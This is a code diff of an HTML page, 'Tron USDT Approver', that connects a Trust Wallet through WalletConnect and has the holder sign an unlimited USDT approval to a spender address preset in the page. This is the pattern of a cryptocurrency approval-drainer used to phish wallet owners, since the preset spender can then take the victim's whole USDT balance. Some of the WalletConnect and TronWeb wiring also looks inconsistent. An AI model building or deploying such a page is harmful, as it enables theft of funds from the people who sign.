@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Tron USDT Approver</title>
-    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
+    <script src="https://unpkg.com/@walletconnect/web3-provider@2.13.4/dist/umd/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
     <style>
         body { font-family: Arial, sans-serif; max-width: 400px; margin: 50px auto; padding: 20px; text-align: center; }
@@ -16,6 +16,7 @@
         .error { background: #f8d7da; color: #721c24; }
         .info { background: #d1ecf1; color: #0c5460; }
         input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
+        #qrCode { margin: 20px 0; }
     </style>
 </head>
 <body>
@@ -23,134 +24,157 @@
     
     <div id="status" class="status info">Ready to connect Trust Wallet</div>
     
-    <!-- Replace with your WalletConnect Project ID -->
-    <input type="text" id="projectId" placeholder="Enter your WalletConnect Project ID" value="171db6da15a54effc1b4a06f889a3c3f">
-    <input type="text" id="spenderAddress" placeholder="Spender Contract Address" value="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV">
+    <input type="text" id="projectId" placeholder="Enter WalletConnect v2 Project ID" value="171db6da15a54effc1b4a06f889a3c3f">
+    <input type="text" id="spenderAddress" placeholder="Spender Address (T...)" value="TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV">
     
     <button id="connectBtn">🔗 Connect Trust Wallet</button>
+    <div id="qrCode"></div>
     <button id="approveBtn" disabled>✅ Approve Unlimited USDT</button>
     
     <div id="connectedWallet"></div>
     <div id="txStatus"></div>
 
     <script>
-        // USDT TRC20 Mainnet Contract
         const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-        const PROJECT_ID = document.getElementById('projectId').value;
-        const SPENDER_ADDRESS = document.getElementById('spenderAddress');
-        
         let tronWeb = null;
-        let provider = null;
+        let walletConnector = null;
         let isConnected = false;
 
-        // Initialize WalletConnect Provider (same as Tronscan)
-        async function initWalletConnect() {
-            provider = new WalletConnectProvider({
-                rpc: {
-                    728126428: "https://api.trongrid.io",
-                },
-                qrcode: true,
-                projectId: PROJECT_ID,
+        // WalletConnect v2 + TronWeb integration (Tronscan exact flow)
+        async function initWalletConnect(projectId) {
+            const { WalletConnectProvider } = window.WalletConnectProvider;
+            
+            walletConnector = await WalletConnectProvider.init({
+                projectId: projectId,
+                chains: [728126428], // Tron mainnet chain ID
+                showQrModal: true,
                 metadata: {
                     name: "USDT Approver",
-                    description: "Approve unlimited USDT for your dApp",
-                    url: window.location.href,
-                    icons: [window.location.origin + '/icon.png']
+                    description: "Approve unlimited USDT",
+                    url: "https://your-dapp.com",
+                    icons: []
                 }
             });
 
-            await provider.enable();
-            
-            tronWeb = new TronWeb({
-                fullHost: 'https://api.trongrid.io',
-                headers: { "TRON-PRO-API-KEY": "" },
-                privateKey: null,
-                providers: {
-                    _web: provider
-                }
+            // Subscribe to events
+            walletConnector.on("display_uri", (uri) => {
+                console.log("QR Code URI:", uri);
             });
+
+            walletConnector.on("connect", async () => {
+                console.log("Wallet connected");
+            });
+
+            walletConnector.on("disconnect", () => {
+                console.log("Wallet disconnected");
+                resetUI();
+            });
+
+            // Enable session
+            const session = await walletConnector.connect();
+            console.log("Session:", session);
         }
 
-        // Connect wallet (exact Tronscan flow)
+        // Connect button handler
         document.getElementById('connectBtn').onclick = async () => {
+            const projectId = document.getElementById('projectId').value.trim();
+            if (!projectId) {
+                alert('Please enter your WalletConnect Project ID');
+                return;
+            }
+
             try {
-                document.getElementById('status').textContent = 'Connecting to Trust Wallet...';
+                document.getElementById('status').textContent = '🔄 Initializing WalletConnect...';
                 document.getElementById('status').className = 'status info';
+
+                // Init WalletConnect v2
+                await initWalletConnect(projectId);
+
+                // Create TronWeb instance with WalletConnect provider
+                tronWeb = new TronWeb({
+                    fullHost: 'https://api.trongrid.io',
+                    headers: { "TRON-PRO-API-KEY": "" },
+                    providers: {
+                        _web: walletConnector
+                    }
+                });
+
+                // Get account
+                const accounts = await walletConnector.enable();
+                const address = accounts[0];
                 
-                await initWalletConnect();
-                
-                const address = await tronWeb.trx.getAccount();
-                if (address && address.base58) {
+                if (address && TronWeb.isAddress(address)) {
                     isConnected = true;
                     document.getElementById('connectedWallet').innerHTML = 
-                        `<strong>Connected:</strong> ${address.base58}`;
-                    document.getElementById('connectBtn').disabled = true;
+                        `<strong>✅ Connected:</strong> ${address}`;
+                    document.getElementById('connectBtn').style.display = 'none';
                     document.getElementById('approveBtn').disabled = false;
-                    document.getElementById('status').innerHTML = '✅ Wallet connected successfully!<br>Ready to approve unlimited USDT';
+                    document.getElementById('status').innerHTML = 
+                        '✅ Wallet connected!<br>Ready to approve unlimited USDT';
                     document.getElementById('status').className = 'status success';
                 }
             } catch (error) {
+                console.error(error);
                 document.getElementById('status').innerHTML = `❌ Connection failed: ${error.message}`;
                 document.getElementById('status').className = 'status error';
             }
         };
 
-        // Approve unlimited USDT (exact Tronscan transaction format)
+        // USDT Unlimited Approval (Tronscan exact transaction)
         document.getElementById('approveBtn').onclick = async () => {
             try {
-                const spender = SPENDER_ADDRESS.value.trim();
+                const spender = document.getElementById('spenderAddress').value.trim();
                 if (!spender || !TronWeb.isAddress(spender)) {
                     throw new Error('Invalid spender address');
                 }
 
-                document.getElementById('status').textContent = 'Building USDT approval transaction...';
-                
-                // USDT approve function signature
-                const approveData = '0000000000000000000000000000000000000000' + 
-                                  spender.slice(2).toLowerCase() + 
-                                  '0000000000000000000000000000000000' + 
-                                  'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+                document.getElementById('status').textContent = '📝 Building approval transaction...';
 
+                // Get USDT contract
                 const contract = await tronWeb.contract().at(USDT_CONTRACT);
+
+                // Unlimited approval (max uint256)
+                const amount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
                 
-                const tx = await contract.approve(spender, '115792089237316195423570985008687907853269984665640564039457584007913129639935').build();
-                
-                document.getElementById('status').textContent = 'Sending approval transaction...';
-                
-                const signedTx = await tronWeb.trx.sendRawTransaction(tx);
-                
-                if (signedTx.result) {
+                document.getElementById('status').textContent = '📤 Sending approval transaction...';
+
+                // Execute approval (exact Tronscan method)
+                const result = await contract.approve(spender, amount).send({
+                    feeLimit: 100000000, // 100 TRX
+                    callValue: 0
+                });
+
+                if (result) {
                     document.getElementById('txStatus').innerHTML = `
                         <div class="status success">
                             ✅ <strong>APPROVAL SUCCESSFUL!</strong><br>
-                            <a href="https://tronscan.org/#/transaction/${signedTx.txid}" target="_blank">View on Tronscan</a>
+                            TxID: <a href="https://tronscan.org/#/transaction/${result}" target="_blank">${result}</a>
                         </div>
                     `;
+                    document.getElementById('approveBtn').innerHTML = '✅ Approved!';
                     document.getElementById('approveBtn').disabled = true;
-                } else {
-                    throw new Error('Transaction failed');
                 }
-                
             } catch (error) {
+                console.error(error);
                 document.getElementById('status').innerHTML = `❌ Approval failed: ${error.message}`;
                 document.getElementById('status').className = 'status error';
             }
         };
 
-        // Auto-detect project ID change
-        document.getElementById('projectId').onchange = () => {
-            resetUI();
-        };
-
         function resetUI() {
             isConnected = false;
+            document.getElementById('connectBtn').style.display = 'block';
             document.getElementById('connectBtn').disabled = false;
             document.getElementById('approveBtn').disabled = true;
+            document.getElementById('approveBtn').innerHTML = '✅ Approve Unlimited USDT';
             document.getElementById('connectedWallet').innerHTML = '';
             document.getElementById('txStatus').innerHTML = '';
             document.getElementById('status').textContent = 'Ready to connect Trust Wallet';
             document.getElementById('status').className = 'status info';
         }
+
+        // Reset on project ID change
+        document.getElementById('projectId').oninput = resetUI;
     </script>
 </body>
 </html>
